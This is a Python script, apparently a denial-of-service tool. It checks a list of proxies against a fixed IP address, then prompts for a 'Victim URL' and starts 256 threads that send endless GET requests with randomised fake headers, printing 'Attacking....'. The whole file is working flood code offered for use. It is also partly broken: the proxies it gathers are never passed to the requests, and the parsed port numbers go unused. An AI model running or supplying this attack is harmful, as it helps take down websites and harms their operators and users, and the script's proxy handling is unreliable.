import requests
import concurrent.futures
import re
from fake_headers import Headers
from itertools import cycle

def checkProxy(proxy):
    try:
        proxies = {"http": proxy, "https": proxy}
        proxyResult = requests.get("http://95.111.193.223/", timeout=10, proxies=proxies)
        if proxyResult.status_code == 200:
            print(f"Proxy {proxy} is working and appended to the list!")
            return proxy
        else:
            print(f"Proxy {proxy} is not working!")
    except requests.exceptions.RequestException:
        print(f"Proxy {proxy} is not working!")

def readProxy():
    with open('proxies.txt', 'r') as f:
        content = f.read()
    ip_addresses = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", content)
    port_numbers = re.findall(r":\d{1,5}", content)
    return [f"http://{ip_addresses[i]}" for i in range(len(ip_addresses))]

def makeRequest(proxy, i, url):
    try:
        while True:
            proxies = {
        "http": proxy,
        "https": proxy
            }
            print(f"Thread Id: {i} : {proxy}")
            headers = Headers(headers=True).generate()
            try:
                r = requests.get(url=url, headers=headers, timeout=1)
                print(f"Thread Id: {i} : {r.status_code} Attacking....")
            except requests.exceptions.RequestException as e:
                print(f"[-] Error: Failed to make the HTTP request in Thread Id: {i}")
                print(e)
    except Exception as e:
        print(e)

def main():
    print("Checking proxies...")
    ProxyList = readProxy()
    workingProxies = []

    with concurrent.futures.ThreadPoolExecutor() as executor:
        results = [executor.submit(checkProxy, proxy) for proxy in ProxyList]
        for future in concurrent.futures.as_completed(results):
            proxy = future.result()
            if proxy:
                workingProxies.append(proxy)
    print(workingProxies)
    print("Checking proxies completed!")
    print(f"Working proxies: {workingProxies}")

    victim = input("Enter the Victim URL: ")
    thread_count = 256
    proxy_cycle = cycle(workingProxies)
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
        for i in range(thread_count):
            executor.submit(makeRequest, next(proxy_cycle), i, victim)

    print("Threads are ready to attack....")
    

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting...")
